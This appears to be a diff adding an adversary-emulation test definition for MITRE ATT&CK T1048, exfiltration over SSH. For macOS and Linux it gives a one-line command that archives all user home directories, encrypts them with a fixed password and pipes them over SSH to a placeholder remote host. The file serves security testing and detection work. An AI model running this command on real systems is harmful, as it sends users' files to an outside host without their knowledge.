@@ -1,0 +1,30 @@
+---
+- id: 7db784562afbea0265fcafc4243b66de
+  name: Exfiltration Over Alternative Protocol - SSH
+  description: 'Input a domain and test Exfiltration over SSH
+
+
+    Local to Remote
+
+
+    Upon successful execution, tar will compress /Users/* directory and password protect
+    the file modification of `Users.tar.gz.enc` as output.
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
+  platforms:
+    darwin:
+      sh:
+        command: tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com
+          'cat > /Users.tar.gz.enc'
+        payloads: []
+        cleanup: ''
+    linux:
+      sh:
+        command: tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com
+          'cat > /Users.tar.gz.enc'
+        payloads: []
+        cleanup: ''
